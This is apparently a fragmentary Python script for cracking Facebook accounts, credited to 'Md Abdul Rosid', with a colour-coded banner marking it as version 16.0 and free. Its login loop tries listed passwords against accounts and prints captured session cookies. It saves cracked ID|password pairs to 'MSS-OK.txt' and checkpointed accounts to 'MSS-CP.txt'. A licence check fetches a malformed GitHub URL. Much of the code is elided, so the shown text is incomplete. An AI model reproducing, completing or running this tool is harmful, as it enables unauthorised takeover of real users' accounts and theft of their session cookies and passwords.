...
--------------------------------------------------
[•]\033[1;32mCREATED BY     : \033[1;32mMd Abdul Rosid\033[1;32m
[•]\033[1;32mFACEBOOK       : \033[1;32mMd Abdul Rosid\033[1;32m
[•]\033[1;32mYOUTUBE        : \033[1;32mERROR\033[1;32m
[•]\033[1;32mSTATUS         : \033[1;32mFREE\033[1;32m
--------------------------------------------------
[•] \033[1;37mVERSION    :\033[1;32m 16.0 \033[1;33m"DON'T WORRY FOR UPDATES!"\033[1;33m
--------------------------------------------------"""
        ...
        for ps in pwx:
           ...
           #print(iid+'|'+pws+'|'+str(log_cookies))
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[SWATI-OK] '+cid+'|'+ps+'\033[0;97m\n[‎‎🍁]\033[0;93m COOKIE = \033[1;34m'+coki+  '  ''  \033[0;97m')
                open('MSS-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                # print('\033[1;33m[SWATI-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('MSS-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mSWATI\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
...
def approval():
  ...
  try:
    httpCaht = requests.get('https://https://github.com/Rosid456/magi/blob/main/Magi.txt').text
    if id in httpCaht:
